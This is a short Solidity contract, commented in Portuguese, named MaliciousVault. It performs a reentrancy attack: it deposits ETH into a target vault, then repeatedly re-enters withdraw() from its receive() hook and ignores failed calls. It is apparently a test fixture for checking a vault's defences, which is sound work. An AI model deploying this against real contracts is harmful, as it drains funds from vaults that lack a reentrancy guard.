// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

/// Contrato atacante que tenta re-entrar em withdraw() durante o receive.
contract MaliciousVault {
    IVault public immutable vault;
    address public immutable attacker;

    constructor(address _vault) {
        vault = IVault(_vault);
        attacker = msg.sender;
    }

    // Deposita `msg.value` no cofre e imediatamente tenta sacar o mesmo valor
    // acionando a reentancia atraves do receive.
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    /// Chamado quando o cofre envia ETH para este contrato.
    /// Tenta re-entrar em withdraw() ignorando erros para não desfazer a transação externa.
    receive() external payable {
        if (address(vault).balance > 0) {
            (bool success, ) = address(vault).call(
                abi.encodeWithSelector(IVault.withdraw.selector, vault.balances(address(this)))
            );
        }
    }
}